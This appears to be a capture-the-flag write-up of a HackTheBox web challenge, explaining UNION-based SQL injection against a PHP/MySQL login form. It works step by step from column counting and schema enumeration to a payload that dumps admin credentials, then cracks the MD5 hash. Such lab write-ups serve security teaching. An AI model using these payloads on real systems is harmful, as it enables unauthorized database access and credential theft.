---
title: "SQL Injection: UNION-Based Data Exfiltration"
date: "2025-09-21"
category: "Web"
description: "Extracting database schema and user credentials from a login form using classic UNION-based SQL injection."
---

## Overview

This web challenge from HackTheBox featured a PHP login form backed by a MySQL database with no prepared statements. The target was to extract the admin credentials from the users table.

## Identifying the Injection Point

Entering a single quote in the username field returns a MySQL error, confirming unsanitized input reaches the query:

```
POST /login HTTP/1.1
username=admin'&password=test

You have an error in your SQL syntax; check the manual...
near ''admin''' at line 1
```

The underlying query is probably: `SELECT * FROM users WHERE username='$input' AND password='...'`

## Determining Column Count

UNION attacks require matching the number of columns in the original query. We use `ORDER BY` to find the count:

```sql
' ORDER BY 1--   -- OK
' ORDER BY 2--   -- OK
' ORDER BY 3--   -- OK
' ORDER BY 4--   -- Error: Unknown column '4' in 'order clause'
```

Three columns. Now we identify which columns are reflected on the page:

```sql
' UNION SELECT 'a','b','c'--
```

## Extracting Credentials

```sql
-- Enumerate tables
' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database()--
-- Result: users

-- Enumerate columns
' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'--
-- Result: id, username, password

-- Dump credentials
' UNION SELECT username,password,3 FROM users WHERE username='admin'--
-- Result: admin : 5f4dcc3b5aa765d61d8327deb882cf99
```

The hash is `MD5('password')` — easily cracked via any rainbow table. Logging in with `admin:password` completes the challenge and reveals the flag.

## Flag

```
flag{un10n_s3l3ct_1s_y0ur_fr13nd}
```
